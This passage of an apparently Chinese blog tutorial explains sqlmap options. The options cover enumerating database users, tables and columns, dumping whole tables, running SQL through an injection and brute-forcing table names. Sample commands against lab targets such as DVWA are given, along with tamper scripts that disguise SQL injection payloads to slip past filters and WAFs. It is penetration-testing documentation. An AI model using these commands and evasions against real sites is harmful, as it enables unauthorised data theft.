+<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。</p>
+<p>也可以用-U参数指定你想看哪个用户的权限。</p>
+<p><strong>列出数据库管理员角色</strong></p>
+<p>参数：<code>–roles</code></p>
+<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p>
+<p>仅适用于当前数据库是<code>Oracle</code>的时候。</p>
+<p><strong>列出数据库系统的数据库</strong></p>
+<p>参数：<code>–dbs</code></p>
+<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
+<p><strong>列举数据库表</strong></p>
+<p>参数：<code>–tables,–exclude-sysdbs,-D</code></p>
+<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.138/mutillidae/index.php?page=user-info.php&amp;username=111&amp;password=12123&amp;user-info-php-submit-button=View+Account+Details&quot;</span></span><br><span class="line"><span class="comment">--tables -D dvwa</span></span><br></pre></td></tr></table></figure>
+<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
+<p>–exclude-sysdbs参数是指包含了所有的系统数据库。</p>
+<p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>
+<p><strong>列举数据库表中的字段</strong></p>
+<p>参数：<code>–columns,-C,-T,-D</code></p>
+<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
+<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://<span class="strong">*****</span>**/sqlmap/sqlite/get_int.php?id=1&quot; --columns -D testdb -T users -C name</span><br><span class="line"><span class="meta">[...]</span></span><br><span class="line">Database: SQLite_masterdb</span><br><span class="line">Table: users</span><br><span class="line"><span class="meta">[3 columns]</span></span><br><span class="line"><span class="code">+---------+</span>---------+</span><br><span class="line">| Column  | Type|</span><br><span class="line"><span class="code">+---------+</span>---------+</span><br><span class="line">| id  | INTEGER |</span><br><span class="line">| name| TEXT|</span><br><span class="line">| surname | TEXT|</span><br><span class="line"><span class="code">+---------+</span>---------+</span><br></pre></td></tr></table></figure>
+<p><strong>列举数据库系统的架构</strong></p>
+<p>参数：<code>–schema,–exclude-sysdbs</code></p>
+<p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p>
+<p>加上<code>–exclude-sysdbs</code>参数，将不会获取数据库自带的系统库内容。</p>
+<p>MySQL例子：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://<span class="strong">*****</span>**/sqlmap/mysql/get_int.php?id=1&quot; --schema --batch --exclude-sysdbs</span><br><span class="line"><span class="meta">[...]</span></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: accounts</span><br><span class="line"><span class="meta">[4 columns]</span></span><br><span class="line"><span class="code">+-------------+</span>---------+</span><br><span class="line">| Column  | Type|</span><br><span class="line"><span class="code">+-------------+</span>---------+</span><br><span class="line">| cid | int(11) |</span><br><span class="line">| mysignature | text|</span><br><span class="line">| password| text|</span><br><span class="line">| username| text|</span><br><span class="line"><span class="code">+-------------+</span>---------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: blogs_table</span><br><span class="line"><span class="meta">[4 columns]</span></span><br><span class="line"><span class="code">+--------------+</span>----------+</span><br><span class="line">| Column   | Type |</span><br><span class="line"><span class="code">+--------------+</span>----------+</span><br><span class="line">| date | datetime |</span><br><span class="line">| blogger_name | text |</span><br><span class="line">| cid  | int(11)  |</span><br><span class="line">| comment  | text |</span><br><span class="line"><span class="code">+--------------+</span>----------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: hitlog</span><br><span class="line"><span class="meta">[6 columns]</span></span><br><span class="line"><span class="code">+----------+</span>----------+</span><br><span class="line">| Column   | Type |</span><br><span class="line"><span class="code">+----------+</span>----------+</span><br><span class="line">| date | datetime |</span><br><span class="line">| browser  | text |</span><br><span class="line">| cid  | int(11)  |</span><br><span class="line">| hostname | text |</span><br><span class="line">| ip   | text |</span><br><span class="line">| referer  | text |</span><br><span class="line"><span class="code">+----------+</span>----------+</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">Table: users</span><br><span class="line"><span class="meta">[3 columns]</span></span><br><span class="line"><span class="code">+---------+</span>---------------+</span><br><span class="line">| Column  | Type  |</span><br><span class="line"><span class="code">+---------+</span>---------------+</span><br><span class="line">| id  | int(11)   |</span><br><span class="line">| name| varchar(500)  |</span><br><span class="line">| surname | varchar(1000) |</span><br><span class="line"><span class="code">+---------+</span>---------------+</span><br><span class="line"><span class="meta">[...]</span></span><br></pre></td></tr></table></figure>
+<p><strong>获取表中数据个数</strong></p>
+<p>参数：<code>–count</code></p>
+<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
+<p>列举一个<code>Microsoft SQL Server</code>例子：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;</span> --count -D testdb</span><br><span class="line">[...]</span><br><span class="line">Database: testdb</span><br><span class="line">+----------------+---------+</span><br><span class="line">|<span class="string"> Table  </span>|<span class="string"> Entries </span>|</span><br><span class="line">+----------------+---------+</span><br><span class="line">|<span class="string"> dbo.users  </span>|<span class="string"> 4   </span>|</span><br><span class="line">|<span class="string"> dbo.users_blob </span>|<span class="string"> 2   </span>|</span><br><span class="line">+----------------+---------+</span><br></pre></td></tr></table></figure>
+<p><strong>获取整个表的数据</strong></p>
+<p>参数：<code>–dump,-C,-T,-D,–start,–stop,–first,–last</code></p>
+<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p>
+<p>使用<code>-D,-T</code>参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。</p>
+<p>列举一个<code>Firebird</code>的例子：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot; --dump -T users</span><br><span class="line"><span class="meta">[...]</span></span><br><span class="line">Database: Firebird_masterdb</span><br><span class="line">Table: USERS</span><br><span class="line"><span class="meta">[4 entries]</span></span><br><span class="line"><span class="code">+----+</span>--------<span class="code">+------------+</span></span><br><span class="line">| ID | NAME   | SURNAME|</span><br><span class="line"><span class="code">+----+</span>--------<span class="code">+------------+</span></span><br><span class="line">| 1  | luther | blisset|</span><br><span class="line">| 2  | fluffy | bunny  |</span><br><span class="line">| 3  | wu | ming   |</span><br><span class="line">| 4  | NULL   | nameisnull |</span><br><span class="line"><span class="code">+----+</span>--------<span class="code">+------------+</span></span><br></pre></td></tr></table></figure>
+<p>可以获取指定库中的所有表的内容，只用<code>-dump</code>跟<code>-D</code>参数（不使用-T与-C参数）。</p>
+<p>也可以用-dump跟-C获取指定的字段内容。</p>
+<p>sqlmap为每个表生成了一个CSV文件。</p>
+<p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop</p>
+<p>1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p>
+<p><img src="https://img.npfs06.top/20210326210503.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>也可以用<code>–first与–last</code>参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first</p>
+<p>3:–last</p>
+<p>4:只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
+<p><strong>获取所有数据库表的内容</strong></p>
+<p>参数：<code>–dump-all,–exclude-sysdbs</code></p>
+<p>使用<code>–dump-all</code>参数获取所有数据库表的内容，可同时加上<code>–exclude-sysdbs</code>只获取用户数据库的表，</p>
+<p>需要注意在<code>Microsoft SQL</code><br><code>Server</code>中<code>master</code>数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p>
+<p><strong>搜索字段，表，数据库</strong></p>
+<p>参数：<code>–search,-C,-T,-D</code></p>
+<p><code>–search</code>可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p>
+<p>可以在一下三种情况下使用：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</span></span><br></pre></td></tr></table></figure>
+<p><strong>运行自定义的SQL语句</strong></p>
+<p>参数：<code>–sql-query,–sql-shell</code></p>
+<p><code>sqlmap</code>会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p>
+<p>如果是<code>SELECT</code>查询语句，<code>sqlap</code>将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
+<p>列举一个<code>Mircrosoft SQL Server 2000</code>的例子：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://**********/sqlmap/mssql/get_int.php?id=1&quot;</span></span><br><span class="line">--sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v <span class="number">1</span></span><br><span class="line"><span class="selector-attr">[...]</span></span><br><span class="line"><span class="selector-attr">[hh:mm:14]</span> <span class="selector-attr">[INFO]</span> fetching SQL SELECT query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="selector-attr">[hh:mm:14]</span> <span class="selector-attr">[INFO]</span> retrieved: foo</span><br><span class="line">SELECT <span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;foo&#x27;</span></span><br><span class="line">\$ python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span></span><br><span class="line">--sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;, &#x27;bar&#x27;&quot;</span> -v <span class="number">2</span></span><br><span class="line"><span class="selector-attr">[...]</span></span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> fetching SQL SELECT query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;, &#x27;</span>bar<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> the SQL query provided has more than <span class="selector-tag">a</span> field. sqlmap will now</span><br><span class="line">unpack it into</span><br><span class="line">distinct queries to be able to retrieve the output even <span class="keyword">if</span> we are going blind</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> query: SELECT ISNULL(CAST((CHAR(<span class="number">102</span>)+CHAR(<span class="number">111</span>)+CHAR(<span class="number">111</span>)) AS</span><br><span class="line"><span class="function"><span class="title">VARCHAR</span><span class="params">(<span class="number">8000</span>)</span></span>),</span><br><span class="line">(CHAR(<span class="number">32</span>)))</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> retrieved: foo</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> query: SELECT ISNULL(CAST((CHAR(<span class="number">98</span>)+CHAR(<span class="number">97</span>)+CHAR(<span class="number">114</span>)) AS</span><br><span class="line"><span class="function"><span class="title">VARCHAR</span><span class="params">(<span class="number">8000</span>)</span></span>),</span><br><span class="line">(CHAR(<span class="number">32</span>)))</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> retrieved: bar</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line">SELECT <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>: <span class="string">&#x27;foo, bar&#x27;</span></span><br></pre></td></tr></table></figure>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p><strong>暴力破解表名</strong></p>
+<p>参数：<code>–common-tables</code></p>
+<p>当使用<code>–tables</code>无法获取到数据库的表时，可以使用此参数。</p>
+<p>通常是如下情况：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. `MySQL`数据库版本小于<span class="number">5.0</span>，没有`information_schema`表。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 数据库是`Microssoft Access`，系统表`MSysObjects`是不可读的（默认）。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 当前用户没有权限读取系统中保存数据结构的表的权限。</span><br></pre></td></tr></table></figure>
+<p>暴力破解的表在<code>txt/common-tables.txt</code>文件中，你可以自己添加。</p>
+<p>列举一个MySQL 4.1的例子：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner</span><br><span class="line"></span><br><span class="line">[<span class="built_in">..</span>.]</span><br><span class="line">[hh:mm:39] [<span class="builtin-name">INFO</span>] testing MySQL</span><br><span class="line">[hh:mm:39] [<span class="builtin-name">INFO</span>] confirming MySQL</span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] fetching banner</span><br><span class="line">web<span class="built_in"> server </span>operating system: Windows</span><br><span class="line">web application technology: PHP 5.3.1, Apache 2.2.14</span><br><span class="line">back-end DBMS operating system: Windows</span><br><span class="line">back-end DBMS: MySQL &lt; 5.0.0</span><br><span class="line">banner:<span class="string">&#x27;4.1.21-community-nt&#x27;</span></span><br><span class="line"></span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] checking table existence using items <span class="keyword">from</span> <span class="string">&#x27;/software/sqlmap/txt/common-tables.txt&#x27;</span></span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] adding words used on web<span class="built_in"> page </span><span class="keyword">to</span> the check list</span><br><span class="line">please enter number of threads? [Enter <span class="keyword">for</span> 1 (current)] 8</span><br><span class="line">[hh:mm:43] [<span class="builtin-name">INFO</span>] retrieved: users</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">|<span class="built_in"> users </span>|</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure>
+<p><strong>暴力破解列名</strong></p>
+<p>参数：<code>–common-columns</code></p>
+<p>与暴力破解表名一样，暴力跑的列名在<code>txt/common-columns.txt</code>中。</p>
+<p><img src="https://img.npfs06.top/20210326210523.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>可以选择多线程来尝试破解。</p>
+<h1 id="针对过滤空格的："><a href="#针对过滤空格的：" class="headerlink" title="针对过滤空格的："></a>针对过滤空格的：</h1><p><strong>1:space2dash.py</strong></p>
+<p>作用：用”– 随机字符串%0A” 替换原来的空格</p>
+<p>示例：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br><span class="line">&#x27;1--nVNaVoPYeva%0AAND--ngNvzqu%0A<span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>原理是–n是注释，后面内容不生效，%0A为换行符，这样就可以不使用空格分隔了。</p>
+<p>在以下版本做过测试:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MSSQL</span></span><br><span class="line"><span class="attribute">SQLite</span></span><br></pre></td></tr></table></figure>
+<p><strong>2:space2hash.py</strong></p>
+<p>作用：空格替换为#号 随机字符串 以及换行符</p>
+<p>示例：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">AND</span> <span class="number">9227</span>=<span class="number">9227</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cWfcVRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 4.0, 5.0</span><br></pre></td></tr></table></figure>
+<p><strong>3: space2morehash.py</strong></p>
+<p>作用：空格替换为 #号 以及更多随机字符串 换行符（和上一条原理一致）</p>
+<p>示例：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">AND</span> <span class="number">9227</span>=<span class="number">9227</span> </span><br><span class="line"><span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cWfcVRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure>
+<p>版本要求: </p>
+<ul>
+<li>MySQL &gt;= 5.1.13 Tested<br>针对此做过测试: </li>
+<li>MySQL 5.1.41</li>
+</ul>
+<p><strong>space2mssqlblank.py</strong><br>作用：空格替换为其它空符号<br>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users </span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">08</span>id<span class="operator">%</span><span class="number">02</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">0</span>Fusers</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span></span><br><span class="line">在以下版本做过测试:</span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2000</span></span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span></span><br></pre></td></tr></table></figure>
+<p><strong>4:space2mysqlblank.py</strong></p>
+<p>作用：空格替换其它空白符号</p>
+<p>示例：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">SELECT</span> id <span class="meta">FROM</span> users </span><br><span class="line"><span class="meta">SELECT</span>%0Bid%0BFROM<span class="name">%A0users</span></span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 5.1</span><br></pre></td></tr></table></figure>
+<p><strong>5:space2mssqlhash.py</strong></p>
+<p>作用：替换空格</p>
+<p>示例：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br><span class="line">&#x27;1%23%0AAND%23%0A<span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MSSQL</span></span><br><span class="line"><span class="attribute">MySQL</span></span><br></pre></td></tr></table></figure>
+<p><strong>6:modsecurityversioned.py</strong></p>
+<p>作用：过滤空格，包含完整的查询版本注释</p>
+<p>示例：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1 AND 2&gt;1--&#x27;</span><br><span class="line">&#x27;1 /*!<span class="number">3087</span>4AND 2&gt;1*/--&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 5.0</span><br></pre></td></tr></table></figure>
+<p><strong>7:space2comment.py</strong></p>
+<p>作用：<code>Replaces space character (‘ ‘) with comments ‘/**/’</code></p>
+<p>示例：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users </span><br><span class="line">SELECT<span class="regexp">//i</span>d<span class="regexp">//</span>FROM<span class="regexp">/**/u</span>sers</span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p><strong>8:space2mysqldash.py</strong></p>
+<p>作用：用<code>–%0A</code>替换空格</p>
+<p>注：之前有个<code>mssql</code>的 这个是<code>mysql</code>的</p>
+<p>示例：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br><span class="line">&#x27;1--%0AAND--%0A<span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MySQL</span></span><br><span class="line"><span class="attribute">MSSQL</span></span><br></pre></td></tr></table></figure>
+<p><strong>9:space2plus.py</strong></p>
+<p>作用：用+替换空格</p>
+<p>示例：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">SELECT</span>+id+<span class="keyword">FROM</span>+users<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<p>All</p>
+<p><strong>10:bluecoat.py</strong></p>
+<p>作用：代替空格字符后与一个有效的随机空白字符的<code>SQL</code>语句。 然后替换<code>=为like</code></p>
+<p>示例：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">where</span> id = <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">SELECT</span>%<span class="number">09</span>id <span class="keyword">FROM</span> users <span class="keyword">where</span> id <span class="keyword">LIKE</span> <span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> <span class="number">5</span>.<span class="number">1</span>, SGOS</span><br></pre></td></tr></table></figure>
+<p><strong>11:space2randomblank.py</strong></p>
+<p>作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
+<p>示例：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">SELECT</span>%<span class="number">0</span>Did%<span class="number">0</span>DFROM%<span class="number">0</span>Ausers<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
